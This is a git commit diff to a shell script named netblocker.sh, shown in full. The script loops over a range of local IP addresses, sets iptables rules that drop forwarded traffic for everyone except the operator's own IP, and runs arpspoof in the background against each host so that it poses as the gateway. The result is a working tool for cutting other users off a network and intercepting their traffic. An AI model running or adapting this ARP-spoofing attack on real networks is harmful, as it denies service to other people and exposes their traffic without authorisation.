e04c44c132d90fb818b8afc2d9ef1385f543b447
rff ald <117867334+xiv3r@users.noreply.github.com>
2025-07-12 22:58:15 +0800

    Update netblocker.sh

--- netblocker.sh
+++ netblocker.sh
@@ -40,9 +40,10 @@ for (( i = MIN; i <= MAX; i++ )); do
     IP=$(dec2ip "$i")
 
 # Drop all the packets except your IP source and destination (bidirectional)
-iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-iptables -I FORWARD ! -d "$GATEWAY" -s "$MYIP" -j DROP
-iptables -t nat -A PREROUTING ! -s "$MYIP" -j DNAT --to-destination "$GATEWAY"
+iptables -I FORWARD -s "$MYIP" -d "$GATEWAY" -j ACCEPT
+iptables -I FORWARD -s "$GATEWAY" -d "$MYIP" -j ACCEPT
+iptables -I FORWARD -j DROP
+iptables -t nat -A PREROUTING -s "$MYIP" -j DNAT --to-destination "$GATEWAY"
    
 # Spoofing all the users ARP
 arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
